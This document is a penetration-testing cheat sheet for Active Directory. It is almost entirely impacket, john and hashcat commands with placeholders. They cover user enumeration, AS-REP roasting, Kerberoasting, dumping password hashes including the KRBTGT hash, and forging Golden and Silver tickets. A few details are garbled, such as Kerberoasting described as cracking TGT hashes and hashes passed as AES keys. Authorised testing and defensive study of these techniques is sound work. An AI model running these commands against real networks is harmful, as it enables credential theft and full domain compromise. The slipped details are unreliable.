# Active Directory Penetration Testing
Knowledge of Windows Active Directory is highly important for penetration testing, especially in environments that heavily rely on Microsoft technologies.

#### Time-Sync (against Clock-Skew)
Synchronizes the system with a specific DC.
```bash
sudo rdate -n <ip-domain-controller>
```

#### Users in Active Directory
Retrieves information about users in the Active Directory, utilizing the specified domain controller and credentials.
```bash
impacket-GetADUsers -all -dc-ip <ip-domain-controller> <domain>/<user>:<password>
```

#### AS-REP Roastable Users
Identifies users vulnerable to AS-REP (Authentication Service - Response) attacks.
```bash
impacket-GetNPUsers -dc-ip <ip-domain-controller> <domain>/<username>:<password>
```

#### AS-REP Roasting
Exploits AS-REP vulnerability, retrieves Ticket Granting Ticket (TGT) for a user, and cracks the hash.

Request TGT for User:
```bash
impacket-GetNPUsers <domain>/<user> -dc-ip <ip-domain-controller> -request -format john
```

Crack the Hash of User:
```bash
john --wordlist=<path-to-wordlist> <hash-file>
```

#### More Reconnaissance
Dumps user-secrets, revealing hashed passwords, including those of Domain Admins.
```bash
impacket-secretsdump -dc-ip <ip-domain-controller> '<domain>/<user>:<password>@<target-ip>'
```

#### Ticket Forging - Golden Tickets
Initiates the creation and use of a Golden Ticket for privileged access

Getting SID:
```bash
impacket-lookupsid '<domain>/<admin-user>:<admin-password>@<ip-domain-controller>'
```

Getting the KRBTGT-Hash:
```bash
impacket-secretsdump -dc-ip <ip-domain-controller> '<domain>/<admin-user>:<admin-password>@<ip-domain-controller>' -just-dc-user KRBTGT
```

Creating Golden Ticket:
```bash
impacket-ticketer -aesKey <KRBTGT-Hash> -domain-sid <Domain-SID> -domain <domain> -duration 1 Admin

```

#### Ticket Forging - Silver Tickets
Utilizes a compromised machine account to create a Silver Ticket for unauthorized access.

Machine Account Hash:
```bash
impacket-secretsdump -dc-ip <ip-domain-controller> '<domain>/<admin-user>:<admin-password>@<ip-domain-controller>' | grep -e 'CORP\|MACHINE.ACC'
```

Creating Silver Ticket:
```bash
impacket-ticketer -aesKey <Machine-Account-Hash> -domain-sid <Domain-SID> -domain <domain> -dc-ip <ip-domain-controller> -spn cifs/<target> <user>
```

#### Kerberoasting
Identifies users with Service Principal Names (SPNs) and attempts to crack their Ticket Granting Ticket (TGT) hashes.

Get Users with SPNs:
```bash
impacket-GetUserSPNs -dc-ip <ip-domain-controller> <domain>/<username>:<password>
```

Request TGS for a User:
```bash
impacket-GetUserSPNs -dc-ip <ip-domain-controller> -request <domain>/<username>:<password>
```

Crack the Hash:
```bash
hashcat -m 13100 --force <hash-file> <path-to-wordlist>
```
